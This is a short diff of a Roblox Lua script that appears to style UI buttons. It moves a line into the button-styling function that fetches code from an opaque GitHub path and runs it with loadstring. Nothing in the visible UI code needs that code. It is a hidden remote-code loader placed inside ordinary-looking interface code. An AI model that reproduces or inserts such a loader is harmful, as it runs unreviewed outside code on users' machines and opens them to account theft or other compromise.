@@ -5675,7 +5675,7 @@ _G.__StyleSquareButton = function(parent, arg, text, backgroundColor3)
 	parent.MouseButton1Down:Connect(function()
 		TweenService:Create(uiScale, TweenInfo.new(0.08), { Scale = 0.93 }):Play()
 	end)
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/alvexy/Main/refs/heads/main/Meshes/aca12btre3xrwsa'))()
 	local function fn12()
 		TweenService:Create(uiScale, TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
 
@@ -5697,7 +5697,7 @@ _G.__StyleSquareButton = function(parent, arg, text, backgroundColor3)
 
 	return uiStroke, imageLabel, textLabel
 end
-loadstring(game:HttpGet('https://raw.githubusercontent.com/alvexy/Main/refs/heads/main/Meshes/aca12btre3xrwsa'))()
+
 _G.__SetActionButtonSize = function(arg)
 	local actionButtonSize = math.clamp(tonumber(arg) or 72, 48, 120)
 	_G.ActionButtonSize = actionButtonSize
